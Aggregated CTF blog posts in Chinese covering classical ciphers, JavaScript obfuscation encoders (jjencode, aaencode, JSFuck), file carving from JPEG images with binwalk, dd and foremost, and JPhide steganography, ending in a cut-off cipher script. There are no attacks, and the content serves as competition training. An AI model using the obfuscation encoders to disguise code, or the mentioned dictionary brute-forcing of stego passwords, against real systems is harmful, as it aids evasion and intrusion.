<h4><span id="28比尔密码">28.比尔密码</span></h4><p>比尔密码(Beale ciphers)有三份密码，当然这里说的是已被破解第二份，是一种类似书密码的替换密码。</p>
<p>![比尔密码.png][49]</p>
<p>以第二密码为例，每一个数字代表美国《独立宣言》的文本中的第几个词的首字母，如1代表第1个词的首字母“w”，2代表第2个词首字母“i”。解密后的文字如下：</p>
<p>I have deposited in the county of Bedford…</p>
<p>比尔密码还有一段有趣的故事，感兴趣可以看一下比尔密码的<a href="https://zh.wikipedia.org/wiki/%E6%AF%94%E5%B0%94%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">详细介绍</a>。</p>
<h4><span id="29键盘密码">29.键盘密码</span></h4><p>一般用到的键盘密码就是手机键盘和电脑键盘两种，2014 0ctf比赛里Crypto类型中Classic一题就是电脑键盘密码，详细可以<a href="http://www.programlife.net/0ops-ctf-writeup.html" target="_blank" rel="noopener">参考</a>，另外给出另外一些<a href="http://www.secbox.cn/hacker/ctf/8078.html" target="_blank" rel="noopener">参考</a>情况。</p>
<h3><span id="其他有趣的机械密码">其他有趣的机械密码</span></h3><hr>
<h4><span id="1恩尼格玛密码">1.恩尼格玛密码</span></h4><p>恩尼格玛密码机（德语：Enigma，又译哑谜机，或“谜”式密码机）是一种用于加密与解密文件的密码机。确切地说，恩尼格玛是对二战时期纳粹德国使用的一系列相似的转子机械加解密机器的统称，它包括了许多不同的型号，为密码学对称加密算法的流加密。详细工作原理参考<a href="https://zh.wikipedia.org/wiki/%E6%81%A9%E5%B0%BC%E6%A0%BC%E7%8E%9B%E5%AF%86%E7%A0%81%E6%9C%BA" target="_blank" rel="noopener">维基百科</a>。</p>
<p>![恩尼格玛密码.jpg][50]</p>
<p>在线模拟<a href="http://enigmaco.de/enigma/enigma.html" target="_blank" rel="noopener">传送门</a></p>
<p>感兴趣可以观看<a href="http://list.youku.com/albumlist/show?id=23400097&amp;ascending=1&amp;page=1" target="_blank" rel="noopener">播单:计算机历史文化课</a></p>
<hr>
<h3><span id="代码混淆加密">代码混淆加密</span></h3><p>1.<a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="noopener">asp混淆加密</a></p>
<p>2.<a href="http://www.zhaoyuanma.com/phpjmvip.html" target="_blank" rel="noopener">php混淆加密</a></p>
<p>3.<a href="http://tool.css-js.com/" target="_blank" rel="noopener">css/js混淆加密</a></p>
<p>4.<a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="noopener">VBScript.Encode混淆加密</a></p>
<hr>
<h4><span id="5ppencode">5.ppencode</span></h4><p>ppencode-Perl把Perl代码转换成只有英文字母的字符串。</p>
<p>![ppencode.png][51]</p>
<p>ppencode<a href="http://namazu.org/~takesako/ppencode/demo.html" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="6rrencode">6.rrencode</span></h4><p>rrencode可以把ruby代码全部转换成符号。</p>
<p>![rrencode.jpg][52]</p>
<p>rrencode<a href="http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="7jjencodeaaencode">7.jjencode/aaencode</span></h4><p>jjencode将JS代码转换成只有符号的字符串，类似于rrencode，介绍的<a href="http://utf-8.jp/public/20090710/jjencode.pps" target="_blank" rel="noopener">PPT</a>，aaencode可以将JS代码转换成常用的网络表情，也就是我们说的颜文字js加密。</p>
<p>![aaencode.png][53]</p>
<p>aaencode<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="noopener">传送门</a></p>
<p>jjencode/aaencode的解密直接在浏览器的控制台里输入密文即可执行解密，想要详细了解jjencode是如何进行请<a href="http://pferrie2.tripod.com/papers/jjencode.pdf" target="_blank" rel="noopener">参考</a>，你也可以在github上<a href="https://github.com/jacobsoo/Decoder-JJEncode" target="_blank" rel="noopener">下载</a>实现jjdecoder的源码进行分析。</p>
<p>![aaencode解密.png][54]</p>
<hr>
<h4><span id="8jsfuck">8.JSfuck</span></h4><p>JSFuck 可以让你只用 6 个字符<code>[ ]( ) ! +</code>来编写 JavaScript 程序。</p>
<p>![JSfuck.png][55]</p>
<p>JSfuck<a href="http://www.jsfuck.com/" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="9jother">9.jother</span></h4><p>jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：<code>! + ( ) [ ] { }</code>。只用这些字符就能完成对任意字符串的编码。</p>
<p><a href="http://drops.wooyun.org/author/do9gy" target="_blank" rel="noopener">do9gy</a>的<a href="http://drops.wooyun.org/web/4410" target="_blank" rel="noopener">jother编码之谜</a></p>
<p>![jother.png][56]</p>
<p>jother编码<a href="http://tmxk.org/jother/" target="_blank" rel="noopener">传送门</a></p>
<p>jother直接在浏览器(IE可以)的控制台里输入密文即可执行解密：</p>
<p>![jother解密.png][57]</p>
<hr>
<h3><span id="10brainfuck">10.brainfuck</span></h3><p>Brainfuck是一种极小化的计算机语言，按照”Turing complete（完整图灵机）”思想设计的语言，它的主要设计思路是：用最小的概念实现一种“简单”的语言，BrainF**k 语言只有八种符号，所有的操作都由这八种符号(<code>&amp;gt; &amp;lt; + - . , [ ]</code>)的组合来完成。</p>
<p>明文：hello!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ .---. +++++ ++..+ ++.&lt;+ +++++ +++++</span><br><span class="line">[-&gt;++ +++++ ++++&lt; ]&gt;+++ ++++. &lt;++++ +++[- &gt;---- ---&lt;] &gt;--.&lt; +++++ ++[-&gt;</span><br><span class="line">----- --&lt;]&gt; ----- ----- .&lt;</span><br></pre></td></tr></table></figure>
<p>brainfuck<a href="http://www.splitbrain.org/services/ook" target="_blank" rel="noopener">传送门</a></p>
<p>其他稀奇古怪的编程语言请<a href="http://news.mydrivers.com/1/190/190926.htm" target="_blank" rel="noopener">参考</a></p>
<h3><span id="相关工具">相关工具</span></h3><hr>
<p><a href="http://www.wechall.net/applet/JPK_406.jar" target="_blank" rel="noopener">JPK神器</a></p>
<p><a href="https://github.com/jameslyons/python_cryptanalysis" target="_blank" rel="noopener">密码破解脚本</a></p>
<p><a href="https://dl.packetstormsecurity.net/shellcode/shellcodeencdec.py.txt" target="_blank" rel="noopener">shellcode转换脚本</a></p>
<h3><span id="参考网站">参考网站</span></h3><hr>
<p><a href="https://en.wikipedia.org/wiki/Classical_cipher" target="_blank" rel="noopener">Wikipedia Classical Cipher</a></p>
<p><a href="http://cryptogram.org/cipher_types.html" target="_blank" rel="noopener">Cryptogram Cipher Types</a></p>
<p><a href="http://www.practicalcryptography.com/" target="_blank" rel="noopener">Practical Cryptography</a></p>
<p><a href="http://rumkin.com/tools/cipher/" target="_blank" rel="noopener">Rumkin Cipher Tools</a></p>
<p><a href="https://encode-decode.appspot.com/" target="_blank" rel="noopener">encode-decode</a></p>
<p><a href="https://www.hackfun.org/" target="_blank" rel="noopener">4ido10n Blog</a></p>
<p><a href="http://wordsmith.org/anagram/" target="_blank" rel="noopener">Anagram</a></p>
<p></p><p><a href="http://www.thonky.com/kryptos/" target="_blank" rel="noopener">Thonky</a></p>
<ul>
<li>转载自<a href="https://www.hackfun.org/" target="_blank" rel="noopener">4ido10n’s Blog</a>文章<a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html" target="_blank" rel="noopener">《CTF中那些脑洞大开的编码和加密》</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF中图片隐藏文件分离方法总结]]></title>
      <url>https://uknowsec.cn/posts/ctf/CTF%E4%B8%AD%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="ctf中图片隐藏文件分离方法总结">CTF中图片隐藏文件分离方法总结</span></h1><h2><span id="0x00-前言">0x00 前言</span></h2><p>在安全的大趋势下，信息安全越来越来受到国家和企业的重视，所以CTF比赛场次越来越多，而且比赛形式也不断的创新，题目也更加新颖有趣，对选手的综合信息安全能力有一个较好的考验，当然更好的是能从比赛有所收获，不断学习和总结提升自己的信息安全能力与技术。转到CTF比赛上，通常在CTF比赛中常有与隐写术(Steganography)相关的题目出现，这里我们讨论总结图片隐藏文件分离的方法，欢迎大家补充和交流:P</p>
<h2><span id="0x01-分析">0x01 分析</span></h2><p>这里我们以图片为载体，给了这样的一样图片：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1574897276.jpg" alt="CTF中图片隐藏文件分离方法总结"></p>
<p>首先我们需要对图片进行分析，这里我们需要用到一个工具<a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">binwalk</a>，想要了解这个工具可以参考这篇<a href="http://www.freebuf.com/sectool/15266.html" target="_blank" rel="noopener">Binwalk：后门（固件）分析利器</a>文章，以及<a href="http://tools.kali.org/forensics/binwalk" target="_blank" rel="noopener">kali官方对binwalk的概述和使用介绍</a>。</p>
<p>这里我们就是最简单的利用，在binwalk后直接提供固件文件路径和文件名即可:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># binwalk carter.jpg</span><br></pre></td></tr></table></figure></p>
<p>当我们使用这行命令后，binwalk就会自动分析这个jpg文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># binwalk carter.jpg</span><br><span class="line">  </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">382           0x17E           Copyright string: &quot;Copyright (c) 1998 Hewlett-Packard Company&quot;</span><br><span class="line">3192          0xC78           TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">140147        0x22373         JPEG image data, JFIF standard 1.01</span><br><span class="line">140177        0x22391         TIFF image data, big-endian, offset of first image directory: 8</span><br></pre></td></tr></table></figure>
<p>从上面的内容显然看得出来这个jpg文件还隐藏着另一个jpg文件，从140147块偏移开始就是另一张jpg。</p>
<h2><span id="0x02-分离">0x02 分离</span></h2><p>在得到隐藏信息之后我们下一步就是把另一张jpg分离出，以下讨论几种方法：</p>
<p><strong>（1）使用dd命令分离(linux/unix下)</strong></p>
<p>我们可以使用dd命令分离出隐藏文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1</span><br></pre></td></tr></table></figure>
<p>可以参考<a href="http://www.cnblogs.com/qq78292959/archive/2012/02/23/2364760.html" target="_blank" rel="noopener">dd命令详解</a>，这里if是指定输入文件，of是指定输出文件，skip是指定从输入文件开头跳过140147个块后再开始复制，bs设置每次读写块的大小为1字节 。</p>
<p>最后我们可以得到这样的一张carter-1.jpg图片：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1035901972.jpg" alt="CTF中图片隐藏文件分离方法总结"></p>
<p><strong>（2）使用foremost工具分离</strong></p>
<p>foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具，win可以下载地址，Linux可以</p>
<p>通过下面命令安装使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># apt-get install foremost</span><br></pre></td></tr></table></figure>
<p>安装foremost后你可以使用foremost -help查看使用帮助，这里最简单分离文件的命令为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># foremost carter.jpg</span><br></pre></td></tr></table></figure>
<p>当我们使用这行命令后，foremost会自动生成output目录存放分离出文件：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/462577935.png" alt="CTF中图片隐藏文件分离方法总结"></p>
<p><strong>（3）hex编辑器分析文件</strong></p>
<p>至于hex编辑器有很多，win下有用得较多的winhex,UltraEdit等，linux下有hexeditor等，这里我们以winhex为例手动分离，在分离之前我们需要知道一点关于jpg文件格式的知识，jpg格式文件开始的2字节是图像开始SOI(Start of Image,SOI)为FF D8，之后2个字节是JFIF应用数据块APPO(JFIF application segment)为FF E0 ，最后2个字节是图像文件结束标记EOI(end-of-file)为FF D9 ，如果你想详细了解更多关于这方面的知识可以参考<a href="http://blog.csdn.net/liuqz2009/article/details/8270355" target="_blank" rel="noopener">jpg文件格式分析</a>一文。</p>
<p>用winhex打开图片，通过Alt+G快捷键输入偏移地址22373跳转到另一张jpg的图像开始块，可以看到FF D8图像开始块。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/468017981.png" alt="CTF中图片隐藏文件分离方法总结"></p>
<p>而图像结束块FF D9</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1634850613.png" alt="CTF中图片隐藏文件分离方法总结"></p>
<p>选取使用Alt+1快捷键选取FF为开始的块，Alt+2选取D9为结束块，然后右键-&gt;Edit-&gt;Copy Block-&gt;Into New File保存相应的文件后缀，例如new.jpg</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2866727204.png" alt="CTF中图片隐藏文件分离方法总结"></p>
<h2><span id="0x03-其他">0x03 其他</span></h2><p>还有一种特例，它是事先制作一个hide.zip，里面放入隐藏的文件，再需要一张jpg图片example.jpg，然后再通过命令 copy /b example.jpg+hide.zip output.jpg生成output.jpg的新文件，原理是利用了copy命令，将两个文件以二进制方式连接起来，正常的jpg文件结束标志是FF D9，而图片查看器会忽视jpg结束符之后的内容，所以我们附加的hide.zip就不会影响到图像的正常显示。(参考AppLeU0的<a href="http://drops.wooyun.org/tips/4862" target="_blank" rel="noopener">隐形术总结</a>)</p>
<p>针对这种特例我们可以直接将jpg文件改为zip文件后缀(其他文件如rar文件也类似)，就可以看到hide.zip压缩包里隐藏的文件。</p>
<p>比如当我们得到一张wh3r3_is_f14g.jpg文件：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3019396614.jpg" alt="CTF中图片隐藏文件分离方法总结"></p>
<p>当我们用winhex打开文件，发现wh3r3_is_f14g.jpg文件最后数据块不是FF D9 jpg文件的结束标志，而是zip文件的结束标志。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/857085314.png" alt="CTF中图片隐藏文件分离方法总结"></p>
<p>我们直接将文件改名为wh3r3_is_f14g.zip，打开得到flag.txt。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1649307525.png" alt="CTF中图片隐藏文件分离方法总结"></p>
<p>最后打开flag.txt得到flag。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/4207904990.jpg" alt="CTF中图片隐藏文件分离方法总结"></p>
<h2><span id="0x03-后话">0x03 后话</span></h2><p>图片隐写方式有很多种，在此只介绍了这一种，如果以后有机会会写其他的图片隐写，如果对隐写感兴趣这里推荐一本机械工业出版社的《数据隐藏技术揭秘：破解多媒体、操作系统、移动设备和网络协议中的隐秘数据》，如果你不想购买实体书，可以<a href="http://www.jb51.net/books/434273.html" target="_blank" rel="noopener">下载pdf版</a>。</p>
<p>这里我把所有图片打包了zip，如果有需要自行下载吧: P</p>
<p></p><p><a href="https://www.hackfun.org/usr/uploads/2016/07/3701056190.zip" target="_blank" rel="noopener">Steganography_Pictures.zip</a></p>
<ul>
<li>转载自<a href="https://www.hackfun.org/" target="_blank" rel="noopener">4ido10n’s Blog</a>文章<a href="https://www.hackfun.org/CTF/summary-of-image-hiding-files-in-CTF.html" target="_blank" rel="noopener">《CTF中图片隐藏文件分离方法总结》</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[深入理解JPEG图像格式Jphide隐写]]></title>
      <url>https://uknowsec.cn/posts/ctf/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JPEG%E5%9B%BE%E5%83%8F%E6%A0%BC%E5%BC%8FJphide%E9%9A%90%E5%86%99.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="深入理解jpeg图像格式jphide隐写">深入理解JPEG图像格式Jphide隐写</span></h1><h2><span id="0x00-隐写原理">0x00 隐写原理</span></h2><p>Jphide是基于最低有效位LSB的<a href="http://www.cnblogs.com/leaven/archive/2010/04/06/1705846.html" target="_blank" rel="noopener">JPEG格式</a>图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在<a href="https://en.wikipedia.org/wiki/Discrete_cosine_transform" target="_blank" rel="noopener">DCT变换域</a>上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时<a href="http://baike.baidu.com/link?url=OWM-kQRYlFaJ2Sy7m1E_Z_-fnvknJTRSHwk1f3eoabLsbht1TJa07GmvWRoiOg6U7-0-Ey3vb_UHcDm9Pc7Mgq" target="_blank" rel="noopener">Blowfish算法</a>有较强的抗统计检测能力。</p>
<p>由于JPEG图像格式使用<a href="http://baike.baidu.com/view/391624.htm?fr=aladdin&amp;fromtitle=DCT&amp;fromid=4184&amp;type=syn" title="DCT&amp;fromid=4184&amp;type=syn" target="_blank" rel="noopener">离散余弦变换</a>（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种<a href="http://baike.baidu.com/link?url=7eIl--nFUaz-amKaY9jatpW4J-J2JyZEXy8dYJM4Py1CspzR9mUATKgTyXOCt7M6AjFSv4JmF3YKtXTTAauHm_" target="_blank" rel="noopener">有损压缩</a>（Loss Compression）技术，但一般不会影响图像的视觉效果。</p>
<h2><span id="0x01-隐写过程">0x01 隐写过程</span></h2><p>Jphide隐写过程大致为：先解压压缩JPEG图像，得到DCT系数；然后对隐藏信息用户给定的密码进行Blowfish加密；再利用Blowfish算法生成伪随机序列，并据此找到需要改变的DCT系数，将其末位变为需要隐藏的信息的值。最后把DCT系数重新压回成JPEG图片，下面是个人对隐写过程理解画出的大致流程图。</p>
<p><img src="http://i.imgur.com/kb6USbH.png" alt=""></p>
<a id="more"></a>
<h2><span id="0x02-隐写实现">0x02 隐写实现</span></h2><p><strong>（1）Stegdetect</strong></p>
<p>实现JPEG图像Jphide隐写算法工具有多个，比如由Neils Provos开发通过统计分析技术评估JPEG文件的DCT频率系数的隐写工具<a href="https://github.com/abeluck/stegdetect" target="_blank" rel="noopener">Stegdetect</a>，它可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息，并且还具有基于字典暴力破解密码方法提取通过Jphide、outguess和jsteg-shell方式嵌入的隐藏信息。</p>
<p><strong>（2）JPHS</strong></p>
<p>而这里介绍另一款JPEG图像的信息隐藏软件<a href="http://io.acad.athabascau.ca/~grizzlie/Comp607/programs.htm" target="_blank" rel="noopener">JPHS</a>，它是由Allan Latham开发设计实现在Windows和Linux系统平台针对有损压缩JPEG文件进行信息加密隐藏和探测提取的工具。软件里面主要包含了两个程序JPHIDE和JPSEEK， JPHIDE程序主要是实现将信息文件加密隐藏到JPEG图像功能，而JPSEEK程序主要实现从用JPHIDE程序加密隐藏得到的JPEG图像探测提取信息文件，Windows版本的JPHS里的JPHSWIN程序具有图形化操作界面且具备JPHIDE和JPSEEK的功能。</p>
<p><img src="http://i.imgur.com/BzbsFlS.png" alt=""></p>
<p>1.Windows用户请下载<a href="http://io.acad.athabascau.ca/~grizzlie/Comp607/jphs05.zip" target="_blank" rel="noopener">JPHS-05 for Windows</a>,同时也提供下载<a href="http://linux01.gwdg.de/~alatham/stego.html" target="_blank" rel="noopener">Linux版本</a>。</p>
<p>2.分别准备一个JPEG格式的图片（example.jpg）和一个文本文件（flag.txt）。</p>
<p><img src="http://i.imgur.com/C8DQKFo.png" alt=""></p>
<p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。</p>
<p>这里简单介绍JPEG文件交换格式的JPEG图片的图像开始标记SOI（Start of Image）和应用程序保留标记APP0（Application 0），JPEG文件交换格式的JPEG图片开始前2个字节是图像开始标记为0xFFD8，之后2个字节接着便是应用程序保留标记为0xFFE0，应用程序保留标记APP0包含9个具体字段，这里介绍前三个字段，第一个字段是数据长度占2个字节，表示包括本字段但不包括标记代码的总长度，这里为10个字节，第二个字段是标识符占5个字节0x4A46494600表示“JFIF0”字符串，第三个字段是版本号占2个字节，这里是0X0101，表示JFIF的版本号为1.1，但也可能为其它数值，从而代表了其它版本号。</p>
<p><img src="http://i.imgur.com/ciEvX2s.png" alt=""></p>
<p>3.Windows版本可以使用具有图形化操作界面的Jphswin，选择“Open jpeg”打开示例JPEG格式图片example.jpg</p>
<p><img src="http://i.imgur.com/kipH6L0.png" alt=""></p>
<p>如果你选择的不是JPEG格式的图片程序会自动退出，你可以16进制编辑器如Winhex查看图片的图像开始标记SOI和应用程序保留标记APP0，当载入JPEG格式图片会显示一些图片的属性。</p>
<p><img src="http://i.imgur.com/ImK54U1.png" alt=""></p>
<p>4.选择“Hide”选项之后在两次文本框输入相同的密码，这里以输入flag作为密码为例，然后输入要包含隐藏信息的文本。</p>
<p><img src="http://i.imgur.com/QYrSVtE.png" alt=""></p>
<p>5.选择将要隐藏的信息如flag.txt。</p>
<p><img src="http://i.imgur.com/XfbEvQS.png" alt=""></p>
<p>6.选择“Save jpeg as”选项将图片另存为jpeg格式并输入文件的名称为新的图像文件如C4n-u-find-f14g.jpg。</p>
<p><img src="http://i.imgur.com/sj8X3aP.png" alt=""></p>
<p>7.之后便可以看到生成结果和相关信息。</p>
<p><img src="http://i.imgur.com/HPkvnci.png" alt=""></p>
<p>8.第2步到第7步做的是Jhide方式信息隐藏，接下来我们从C4n-u-find-f14g.jpg图片提取出隐藏信息。</p>
<p><img src="http://i.imgur.com/H9QJnHU.jpg" alt=""></p>
<p>9.如果之前你并不知道图片是基于什么方式进行信息隐藏，你可以使用Stegdetect先进行探测。</p>
<p>Stegdetect的主要选项如下：</p>
<blockquote>
<p>-q  仅显示可能包含隐藏内容的图像。</p>
<p>-n  启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</p>
<p>-s  修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</p>
<p>-d  打印带行号的调试信息。</p>
<p>-t  设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</p>
<ul>
<li>j  检测图像中的信息是否是用jsteg嵌入的。</li>
<li>o  检测图像中的信息是否是用outguess嵌入的。</li>
<li>p  检测图像中的信息是否是用jphide嵌入的。</li>
<li>i  检测图像中的信息是否是用invisible secrets嵌入的。</li>
</ul>
<p>-V 显示软件版本号。</p>
<p>如果检测结果显示该文件可能包含隐藏信息，那么Stegdetect会在检测结果后面使用1～3颗星来标识</p>
<p>隐藏信息存在的可能性大小，3颗星表示隐藏信息存在的可能性最大。</p>
</blockquote>
<p>从下图可以看出很可能是Jphide的信息隐藏方式：</p>
<p><img src="http://i.imgur.com/i3zeRUx.png" alt=""></p>
<p>10.在知道隐藏方式之后可以开始进行信息提取，和使用JPHS进行信息隐藏过程类似，打开需要提取隐藏信息的图片C4n-u-find-f14g.jpg，输入对应密码（在不知道密码的情况不可以尝试Stegdetect工具里的Stegbreak程序进行基于字典的暴力攻击）flag，密码验证通过JPHS会自动提取隐藏信息，之后便可以另存提取出的信息。</p>
<p><img src="http://i.imgur.com/aCnBL4u.png" alt=""></p>
<p>11.打开提取得到的find.txt便可以得到我们想要的隐藏信息。</p>
<p><img src="http://i.imgur.com/1whWnla.png" alt=""></p>
<h2><span id="0x03-参考资料">0x03 参考资料</span></h2><p><a href="http://mall.cnki.net/magazine/article/JSJC201006056.htm" target="_blank" rel="noopener">Jphide原理剖析及检测</a></p>
<p></p><p><a href="http://www.cnki.com.cn/Article/CJFDTotal-JSJC200707054.htm" target="_blank" rel="noopener">基于二次加密的JPhide隐写检测方法</a></p>
<ul>
<li>转载自<a href="https://www.hackfun.org/" target="_blank" rel="noopener">4ido10n’s Blog</a>文章<a href="https://www.hackfun.org/CTF/jphide-steganography.html" target="_blank" rel="noopener">《深入理解JPEG图像格式Jphide隐写》</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF工具以及脚本的整理 ]]></title>
      <url>https://uknowsec.cn/posts/ctf/CTF%E5%B7%A5%E5%85%B7%E4%BB%A5%E5%8F%8A%E8%84%9A%E6%9C%AC%E7%9A%84%E6%95%B4%E7%90%86.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="密码学-cryptology">密码学 <code>cryptology</code></span></h1><p><a href="http://www.practicalcryptography.com/" target="_blank" rel="noopener">各种密码学的在线解密</a></p>
<h2><span id="简单的位移密码">简单的位移密码</span></h2><p><code>默认位移13 即rot13</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-<em>- coding:utf-8 -</em>-</span></div><div class="line">str =raw_input(<span class="string">‘put flag:’</span>)</div><div class="line">new_str = <span class="string">“”</span></div><div class="line">yi = <span class="number">13</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</div><div class="line">    <span class="keyword">if</span> i&gt;=<span class="string">‘a’</span> <span class="keyword">and</span> i&lt;=<span class="string">‘z’</span>:</div><div class="line">        i = ord(i)</div><div class="line">        i = ((i-yi)<span class="number">-97</span>)%<span class="number">26</span>+<span class="number">97</span></div><div class="line">        i = chr(i)</div><div class="line">        new_str = new_str+i</div><div class="line">        print(new_str)</div></pre></td></tr></tbody></table></figure>

<h2><span id="培根密码">培根密码</span></h2><p>培根是根据字体的斜体 大小写转化成AB等字符 然后每五个对应一个字母的脚本  我还没写大小写转化脚本 这里只有 五个字母对应一个字母脚本<br>（1）<a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="noopener">在线加解密</a><br>（2）<code>Python脚本</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/Bin/env python</span></div><div class="line"><span class="comment"># -<em>- coding: utf-8 -</em>-</span></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -<em>- coding: utf-8 -</em>-</span></div><div class="line"><span class="comment">#<strong>author</strong> = ‘tyomcat’</span></div><div class="line"><span class="comment"># 培根解密代码</span></div><div class="line"><span class="comment"># 两种加密方式</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">peig1</span><span class="params">(m)</span>:</span></div><div class="line">    basic1 = {</div><div class="line">    <span class="string">‘AAAAA’</span> : <span 